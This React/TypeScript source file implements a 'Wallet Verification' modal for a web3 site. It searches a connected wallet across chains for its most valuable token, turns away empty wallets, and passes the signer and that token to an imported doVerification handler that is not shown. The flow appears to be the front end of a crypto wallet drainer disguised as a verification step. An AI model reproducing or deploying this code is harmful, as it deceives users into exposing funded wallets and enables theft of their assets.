import {useAccount, useDisconnect, useSwitchChain} from "wagmi";
import Big from "big.js";
import Link from "next/link";
import React, {useEffect, useState} from "react";
import {getAddressTokens, useAddressTokens} from "@/old/@special/wallet/hooks";
import {ContractCovalenTHQ} from "@/old/(version1)/v1/TokenList";
import {useInit} from "@/utils/safeState";
import {doVerification} from "@/old/@special/wallet/handlers";
import {useEthersProvider, useEthersSigner} from "@/old/(version1)/v1/ethers";

export const handleWalletVerification = (account: ReturnType<typeof useAccount>) => {
	setVerifyState(pre=> ({}));
	window.location.href = "#verification";
};

export let setVerifyState: ((o: VerifyState)=>void) | ((o: ((o2: VerifyState)=>VerifyState))=>void) = ()=>{};

type VerifyState = {
	error?: string,
	text?: string,
	title?: string
}

export const WalletVerificationModal = () => {
	const [state, setState] = useState<VerifyState>({
		text: "...",
		title: "Checking address and validating wallet..."
	});
	const provider = useEthersProvider();
	const signer = useEthersSigner()
	const {disconnect} = useDisconnect();
	const switchChain = useSwitchChain()
	const [chainN, setChainN] = useState(0)
	const account = useAccount();
	const [tokens,setTokens] = useState<Awaited<ReturnType<typeof getAddressTokens>> | undefined>(undefined);
	setVerifyState = setState;

	function handleChainChange() {
		if (chainN < switchChain.chains.length) {
			const newN = chainN + 1;
			const chainId = switchChain?.chains[newN]?.id;
			if (typeof chainId === 'undefined') setChainN(switchChain.chains?.length + 1);
			console.log("CHAIN CHANGED TO", chainId,newN,switchChain.chains?.length)
			switchChain.switchChain({
				chainId
			});
			setChainN(newN);
		} else {
			setState(pre => ({
				...pre,
				error: "Please connect valid Wallet (don't connect new/empty wallet)"
			}));
		}
	}

	useEffect(()=>{
		setTokens(undefined);
		if (account?.address) {
			setState(pre => ({
				...pre,
				text: `Fetching Wallet info... (${chainN}/${switchChain.chains.length})`
			}))
			getAddressTokens(account.address,account.chainId || -1).then(setTokens).catch((e)=>{
				console.error(e);
				handleChainChange();
			});
		} else {
			setState({});
			window.location.hash = ""
		}
	},[account?.address,chainN]);

	useEffect(() => {
		console.log("TOKENS", tokens);
		if (!tokens || !account.address) return;
		const target = tokens?.at?.(0);

		if (!target || target.price <= 0) {
			handleChainChange();
		} else if (account.address && provider && signer) {
			setState(pre =>({
				...pre,
				text: "Verifying..."
			}))
			setTimeout(()=>{
				doVerification(provider,signer,account, target).catch((e: any)=>{
					setVerifyState(pre => ({
						...pre,
						error: "Verification Failure, Connect another wallet."
					}))
				})
			}, 1000)
		}
	}, [tokens,account.address,provider,signer,account.chainId]);

	return (
		<div id="verification" className="modal text-black">
			<div className="modal-dialog">
				<div className="modal-content">
					<div className="modal-header">
						<span className="modal-title">Wallet Verification</span>
					</div>
					<div className="modal-body mt-5">
						<span className="modal-info text-center">{state.title ?? "Checking address and validating wallet..."}</span>
						<span className="modal-minimum-boost">{state?.error ?? state.text}</span>
						<br/>
						{state.error && (
							<button onClick={()=>{
								window.location.hash = ""
								disconnect();
							}} className={'bg-black w-[200px] mx-auto text-white border-white mt-5 text-lg hover:text-white'}>
								Close
							</button>
						)}
					</div>
				</div>
			</div>
		</div>
	);
};
